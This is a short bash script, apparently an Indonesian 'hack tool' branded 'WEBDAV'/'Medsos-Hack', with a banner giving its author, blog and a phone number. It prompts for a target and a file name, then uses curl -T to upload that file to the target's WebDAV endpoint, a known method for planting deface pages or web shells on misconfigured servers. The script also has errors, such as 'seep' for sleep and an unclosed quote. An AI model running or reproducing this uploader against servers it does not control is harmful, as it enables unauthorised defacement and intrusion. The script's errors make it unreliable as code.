clear
figlet '    WEBDAV' | lolcat
echo " ====================================================================== "| 
lolcat
echo " Blog Me       : " $USERNAME "https://securitysystem404.blogspot.com"  | 
lolcat
echo " Author        : " $USERNAME "SilentGhost" | lolcat
echo " Nama Tools    : " $USERNAME "Medsos-Hack"  | lolcat
echo " Realis Tools  : " $USERNAME "01 Januari 2019"  | lolcat
echo " Contact       : " $USERNAME "+6282247571245"  | lolcat
echo " Message       : " $USERNAME "PERGUNAKAN TOOLS INI DENGAN BIJAK"  | lolcat
echo " ====================================================================== "| 
lolcat
sleep 1
read -p "Masukan Target =>" target;
read -p "Masukan Nama Scriptnya =>" script;
sleep 1
echo "Proses.."
curl -T /sdcard/$script $target
seep 1
echo ' [*] => Selesai 
sleep 2
